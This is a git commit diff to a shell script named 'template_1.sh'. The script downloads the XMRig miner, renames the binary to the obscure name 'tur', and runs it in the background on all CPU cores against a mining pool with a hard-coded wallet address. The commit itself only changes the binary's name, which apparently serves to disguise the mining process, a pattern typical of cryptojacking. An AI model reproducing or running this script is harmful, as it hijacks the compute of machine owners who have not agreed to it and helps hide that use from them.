f6807bbf5fe8a854ba46a62422753e145ca47a81
Rickyose <rickyhaterearged@gmail.com>
2022-04-15 08:39:39 +0700

    Update template_1.sh

--- template/template_1.sh
+++ template/template_1.sh
@@ -3,7 +3,7 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
 tar xf xmrig-6.17.0-linux-static-x64.tar.gz
 cd xmrig-6.17.0
-mv xmrig cpuminer
+mv xmrig tur
 
-./cpuminer -o sf.pool-pay.com:4025 --randomx-1gb-pages -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx &
+./tur -o sf.pool-pay.com:4025 --randomx-1gb-pages -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx &
 sleep 5
